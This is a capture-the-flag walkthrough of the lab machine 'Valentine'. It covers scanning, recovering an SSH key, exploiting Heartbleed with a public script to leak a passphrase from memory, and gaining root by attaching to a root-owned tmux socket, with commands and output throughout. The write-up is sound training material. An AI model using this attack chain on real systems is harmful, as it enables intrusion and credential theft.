## valentine


| Name   |      Description |  
|----------|:------------- |
| Machine IP |  10.10.10.79 |
|Difficulty |    Easy   |

## Scanning

### Nmap scanning

```bash
$ nmap  -oN nmap/valentine -sC -sV  10.10.10.79
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 12:23 EDT
Nmap scan report for 10.10.10.79
Host is up (0.096s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2021-09-16T16:27:01+00:00; +3m25s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 3m24s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.21 seconds
```

- Vulnerability scan using nmap

```bash
$ nmap --script vuln -oA nmap/vulnscan 10.10.10.79         
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 12:24 EDT
Nmap scan report for 10.10.10.79
Host is up (0.10s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
443/tcp open  https
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt 
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.imperialviolet.org/2014/10/14/poodle.html
|_sslv2-drown: 

Nmap done: 1 IP address (1 host up) scanned in 57.00 seconds
```


## Enumeration


- Homepage

![homepage](images/homepage.PNG)

- Running gobuster

```bash
$ gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u  http://10.10.10.79 -o gobuster/gobuster.out   
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.79
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/16 12:46:54 Starting gobuster
===============================================================
/index (Status: 200)
/dev (Status: 301)
/encode (Status: 200)
/decode (Status: 200)
/omg (Status: 200)

```
![hype_key](images/hype_key.PNG)

- It is in `hex` when decoded to `ascii`, resulted in encrypted `ssh private` key

![hextoascii](images/hextoascii.PNG)

- We can see that application is vulnerable to `heartbleed`

- Download the script from [Github](https://gist.github.com/eelsivart/10174134).

Running `heartbleed`

```bash
$ python heartbleed.py       

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
Usage: heartbleed.py server [options]

Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  TCP port to test (default: 443)
  -n NUM, --num=NUM     Number of times to connect/loop (default: 1)
  -s, --starttls        Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...
  -f FILEIN, --filein=FILEIN
                        Specify input file, line delimited, IPs or hostnames
                        or IP:port or hostname:port
  -v, --verbose         Enable verbose output
  -x, --hexdump         Enable hex output
  -r RAWOUTFILE, --rawoutfile=RAWOUTFILE
                        Dump the raw memory contents to a file
  -a ASCIIOUTFILE, --asciioutfile=ASCIIOUTFILE
                        Dump the ascii contents to a file
  -d, --donotdisplay    Do not display returned data on screen
  -e, --extractkey      Attempt to extract RSA Private Key, will exit when
                        found. Choosing this enables -d, do not display
                        returned data on screen.
```

- default run

```bash
$ python heartbleed.py 10.10.10.79

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#q

```



```bash
python heartbleed.py 10.10.10.79 -n 100
.!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..!..X.F....c.aM=..]q.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#q
```

- Found a `base64` encode value

```bash
$ echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
heartbleedbelievethehype
```


- Combining the above information, we can log in as `hype` using `ssh`

```bash
$ ssh -i hype.key hype@10.10.10.79                                                    130 ⨯
The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.
Enter passphrase for key 'hype.key': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
```


## Privilege escalation


- Running `linpeas`, did not result in valuable info.
- But `bash_history` has import file `/.devs/dev_sess `, a tmux session file.

```bash
hype@Valentine:~$ cat .bash_history 

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
```

- look for all processing running as root

```bash
hype@Valentine:~$ ps -ef | grep root
root          1      0  0 09:25 ?        00:00:00 /sbin/init
root          2      0  0 09:25 ?        00:00:00 [kthreadd]
n/getty -8 38400 tty5
root       1048      1  0 09:25 ?        00:00:00 /usr/bin/tmux -S /.devs/dev_sess
root       1051   1048  0 09:25 pts/15   00:00:00 -bash
root       1055      1  0 09:25 tty2     00:00:00 /sbin/getty -8 38400 tty2
root       1056      1  0 09:25 tty3     00:00:00 /sbin/getty -8 38400 tty3
root       1061      1  0 09:25 tty6     00:00:00 /sbin/getty -8 38400 tty6
root       1080      1  0 09:25 ?        00:00:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
root       1081      1  0 09:25 ?        00:00:00 cron
root       1099    327  0 09:25 ?        00:00:00 /sbin/udevd --daemon
root       1133      1  0 09:25 ?        00:00:01 /usr/bin/vmtoolsd
root       1295      1  0 09:25 ?        00:00:00 /usr/sbin/apache2 -k start
root       1476      1  0 09:25 tty1     00:00:00 /sbin/getty -8 38400 tty1
root       1633      1  0 09:25 ?        00:00:00 /usr/lib/vmware-vgauth/VGAuthService -s
root       1668      1  0 09:25 ?        00:00:00 //usr/lib/vmware-caf/pme/bin/ManagementAgentHost
root       2473      2  0 09:55 ?        00:00:00 [kworker/0:1]
root       2493      2  0 10:00 ?        00:00:00 [kworker/0:2]
root       2496    943  0 10:00 ?        00:00:00 sshd: hype [priv]   
root       2499      1  0 10:01 ?        00:00:00 /usr/sbin/console-kit-daemon --no-daemon
hype       2833   2708  0 10:04 pts/0    00:00:00 grep --color=auto root
```

- we can see that a tmux process is running

![tmux_process](images/tmux_process.PNG)

- and our user `hype` as `rw` permissions on `socket file`

```bash
hype@Valentine:~$ ls -la /.devs/dev_sess
srw-rw---- 1 root hype 0 Sep 16 09:25 /.devs/dev_sess
```

- We can hop into that session

```bash
hype@Valentine:~$ tmux -S /.devs/dev_sess
```

__Result__

```bash
root@Valentine:/home/hype# id
uid=0(root) gid=0(root) groups=0(root)
root@Valentine:/home/hype# 
```

